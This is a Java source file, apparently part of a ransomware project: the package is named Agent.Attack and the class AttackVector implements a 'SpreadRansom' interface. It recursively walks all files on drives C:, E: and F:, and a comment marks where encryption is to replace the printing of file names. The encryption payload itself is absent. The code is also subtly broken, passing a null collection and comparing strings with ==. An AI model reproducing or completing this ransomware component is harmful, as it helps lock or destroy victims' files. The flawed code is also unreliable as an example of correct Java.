package Agent.Attack;

import java.io.File;
import java.util.Collection;

import Agent.SpreadR.SpreadRansom;

public class AttackVector implements SpreadRansom {

	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null)
			return false;
		else {
			for (File directory : folderTree) {

				if (directory.getName() == file.getName()) {
					return true;
				}
			}
			return false;
		}

	}

	// Recursive function to traverse the given directory in Java using DFS
	public void listf(String directoryName, Collection<File> dirs) {
		File directory = new File(directoryName);

		// Get all files from a directory.
		File[] fList = directory.listFiles();
		if (fList != null) {
			for (File file : fList) {
				if (file.isDirectory()) {
					try {
						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
						}
					} catch (NullPointerException e) {
					}

					listf(file.getAbsolutePath(), dirs);

					//
				} else if (file.isFile()) {
					System.out.println("\t" + file.getName());
					// encryption instead of printing names of files 

				}
			}
		}
	}

	@Override
	public void spread() {

		Collection<File> _folderTree = null;
		listf("C:\\", _folderTree);
		listf("E:\\", _folderTree);
		listf("F:\\", _folderTree);
	}

}
